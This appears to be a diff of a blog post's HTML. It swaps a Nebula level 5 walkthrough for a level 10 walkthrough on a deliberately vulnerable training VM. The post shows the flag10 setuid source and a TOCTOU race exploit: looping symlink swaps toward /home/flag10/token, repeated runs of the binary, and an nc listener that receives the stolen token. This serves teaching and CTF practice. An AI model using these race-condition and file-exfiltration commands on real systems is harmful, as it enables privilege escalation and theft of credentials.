@@ -15,7 +15,7 @@
     <title>
       
       
-         Writeup: Nebula (level 5) 
+         Writeup: Nebula (level 10) 
       
     </title>
     <link rel="canonical" href="https://chuang76.github.io/posts/nebula_p4/">
@@ -420,7 +420,7 @@
 
 
 <section id=content>
-  <h1> Writeup: Nebula (level 5) </h1>
+  <h1> Writeup: Nebula (level 10) </h1>
 
   
     <div id=sub-header>
@@ -431,36 +431,129 @@
   <div class="entry-content">
     <p>Nebula is a virtual machine that covers a variety of challenges about Linux privilege escalation, scripting language issues, and file system race conditions. It is available at <a href="https://exploit-exercises.lains.space/">Exploit Exercises</a>.</p>
 <!-- raw HTML omitted -->
-<h2 id="level-5">Level 5</h2>
-<p>The description of Level 5 is provided as follows.</p>
-<pre><code>Check the flag05 home directory. You are looking for weak directory permissions
+<h2 id="level-10">Level 10</h2>
+<p>The description of Level 10 is provided as follows.</p>
+<pre><code>The setuid binary at /home/flag10/flag10 binary will upload any file given, 
+as long as it meets the requirements of the access() system call.
 
-To do this level, log in as the level05 account with the password level05. 
-Files for this level can be found in /home/flag05.
-</code></pre><p>We first check the contents in the directory /home/flag05.</p>
-<p><img src="https://github.com/chuang76/image/blob/master/05-1.PNG?raw=true" alt=""></p>
-<p>There is a compressed file in the directory .backup. Let&rsquo;s try to uncompress it. However, the error message indicates that we don&rsquo;t have the permission.</p>
-<p><img src="https://github.com/chuang76/image/blob/master/05-2.PNG?raw=true" alt=""></p>
-<p>To get rid of the permission issue, let&rsquo;s copy this file into /tmp directory.</p>
-<p><img src="https://github.com/chuang76/image/blob/master/05-3.PNG?raw=true" alt=""></p>
-<p>Now, we are able to uncompress the compressed file with tar command.</p>
-<p><img src="https://github.com/chuang76/image/blob/master/05-4.PNG?raw=true" alt=""></p>
-<p>After uncompressing the file, we obtain the public key, which helps us to log into a remotely as account flag05. <a href="https://en.wikipedia.org/wiki/SSH_(Secure_Shell)">SSH</a> (Secure shell) is a cryptographic network protocol. It provides users to control the remote servers over the Internet, such as login, remote command-line, to name a few.</p>
-<p>Since SSH uses <a href="https://en.wikipedia.org/wiki/Public-key_cryptography">public-key cryptography</a> to authenticate and now we have the public key, we are allowed to log in remotely as the account flag05 without any passwords. Let&rsquo;s try it via ssh command.</p>
-<pre><code>$ ssh flag05@localhost
-</code></pre><p>As you can see, we log in as the account flag05.</p>
-<p><img src="https://github.com/chuang76/image/blob/master/05-5.PNG?raw=true" alt=""></p>
+To do this level, log in as the level10 account with the password level10. 
+Files for this level can be found in /home/flag10.
+</code></pre><!-- raw HTML omitted -->
+<h2 id="solution-1">Solution 1</h2>
+<p>In this challenge, Nebula left a sensitive file &ldquo;x&rdquo; in /home/level10.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/10-2.PNG?raw=true" alt=""></p>
+<p>It contains ASCII text. Though it shows nothing when we type in cat command (since the file may contain too many blank lines), we can use od command to view the contents of x instead.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/10-3.PNG?raw=true" alt=""></p>
+<p>As you can see, it shows 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27. This strange token may be the password. Let&rsquo;s give it a try.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/10-4.PNG?raw=true" alt=""></p>
 <p>Here is the flag.</p>
-<p><img src="https://github.com/chuang76/image/blob/master/05-6.PNG?raw=true" alt=""></p>
+<p><img src="https://github.com/chuang76/image/blob/master/10-5.PNG?raw=true" alt=""></p>
+<!-- raw HTML omitted -->
+<h2 id="solution-2">Solution 2</h2>
+<p>Let&rsquo;s go back to the directory /home/flag10. Here is its contents.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/10-1.PNG?raw=true" alt=""></p>
+<p>The source code of the executable flag10 is available. The program is going to check the file permission, connect to the port 18211, then read something from the port, and write the data to the buffer.</p>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char **argv)
+{
+  char *file;
+  char *host;
+
+  if(argc &lt; 3) {
+      printf(&quot;%s file host\n\tsends file to host if you have access to it\n&quot;, argv[0]);
+      exit(1);
+  }
+
+  file = argv[1];
+  host = argv[2];
+
+  if(access(argv[1], R_OK) == 0) {
+      int fd;
+      int ffd;
+      int rc;
+      struct sockaddr_in sin;
+      char buffer[4096];
+
+      printf(&quot;Connecting to %s:18211 .. &quot;, host); fflush(stdout);
+
+      fd = socket(AF_INET, SOCK_STREAM, 0);
+
+      memset(&amp;sin, 0, sizeof(struct sockaddr_in));
+      sin.sin_family = AF_INET;
+      sin.sin_addr.s_addr = inet_addr(host);
+      sin.sin_port = htons(18211);
+
+      if(connect(fd, (void *)&amp;sin, sizeof(struct sockaddr_in)) == -1) {
+          printf(&quot;Unable to connect to host %s\n&quot;, host);
+          exit(EXIT_FAILURE);
+      }
+
+#define HITHERE &quot;.oO Oo.\n&quot;
+      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
+          printf(&quot;Unable to write banner to host %s\n&quot;, host);
+          exit(EXIT_FAILURE);
+      }
+#undef HITHERE
+
+      printf(&quot;Connected!\nSending file .. &quot;); fflush(stdout);
+
+      ffd = open(file, O_RDONLY);
+      if(ffd == -1) {
+          printf(&quot;Damn. Unable to open file\n&quot;);
+          exit(EXIT_FAILURE);
+      }
+
+      rc = read(ffd, buffer, sizeof(buffer));
+      if(rc == -1) {
+          printf(&quot;Unable to read from file: %s\n&quot;, strerror(errno));
+          exit(EXIT_FAILURE);
+      }
+
+      write(fd, buffer, rc);
+
+      printf(&quot;wrote file!\n&quot;);
+
+  } else {
+      printf(&quot;You don't have access to %s\n&quot;, file);
+  }
+}
+</code></pre><!-- raw HTML omitted -->
+<h2 id="the-first-attempt">The first attempt</h2>
+<p>Our goal is to view the contents of the file &ldquo;token&rdquo;. So I just create a file in /tmp directory which is pointed to /home/flag10/token via the symbolic link. Then open two terminals (you can use Ctrl + Alt + Fn to switch between TTYs), for the one is used to listen the port and receive the message, the other is used to run the executable /home/flag10/flag10 with the argument 127.0.0.1 (host) and /tmp/vul (file).</p>
+<p>However, it&rsquo;s failed. The error message indicates that I don&rsquo;t have access to the file. The reason is: the argument R_OK in the function access() checks <em>real user ID</em>, not effective user ID like open() function checks. Therefore, we can not pass the verification access() simply with the symbolic link.</p>
+<!-- raw HTML omitted -->
+<h2 id="the-second-attempt">The second attempt</h2>
+<p>Let&rsquo;s view the source code again. The program is a classical <a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">time-of-check to time-of-use</a> (TOCTOU), which is a software bug caused by the race condition. Though we don&rsquo;t have the ability to change the internal memory of the program, we can exploit the race condition to trick the Set-UID. That is, after passing the verification, and before opening the file, we make the file points to our target file /home/flag10/token. Since modern processors run billions of instructions per second, the duration (TOCTOW window) is very short, we need to try it repeatedly. To win the race condition, we can design the workflow as follows.</p>
+<pre><code>1. TTY1: used to keep listening to the port 18211
+2. TTY2: keep running the executable /home/flag10/flag10
+3. TTY3: keep creating a symbolic link to a writable file (pass the verfication)
+         and creating another symbolic link to /home/flag10/token (our target)
+</code></pre><p>Hence, for TTY1, run</p>
+<pre><code>$ nc -k -l 18211
+</code></pre><p>for TTY2, run</p>
+<pre><code>$ while true; do /home/flag10/flag10 /tmp/vul 127.0.0.1; done
+</code></pre><p>for TTY3, run</p>
+<pre><code>$ while true; do ln -sf /tmp/test /tmp/vul; ln -sf /home/flag10/token /tmp/vul; done
+</code></pre><p>Here is the result of TTY1. As you can see, sometimes it prints out &ldquo;test&rdquo; (contents of /tmp/test), while sometimes it prints out the contents of our target file, /home/flag10/token.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/10-10.PNG?raw=true" alt=""></p>
+<p>Here is the flag.</p>
+<p><img src="https://github.com/chuang76/image/blob/master/10-11.PNG?raw=true" alt=""></p>
 
   </div>
 
   <div id=links>
     
-      <a href="https://chuang76.github.io/posts/nebula_p3/">&laquo;&nbsp;Writeup: Nebula (level 4)</a>
+      <a href="https://chuang76.github.io/posts/nebula_p3/">&laquo;&nbsp;Writeup: Nebula (level 6 - level 8)</a>
     
-    
-      <a href="https://chuang76.github.io/posts/nebula_p5/">Writeup: Nebula (level 6)&nbsp;&raquo;</a>
     
   </div>
 </section>
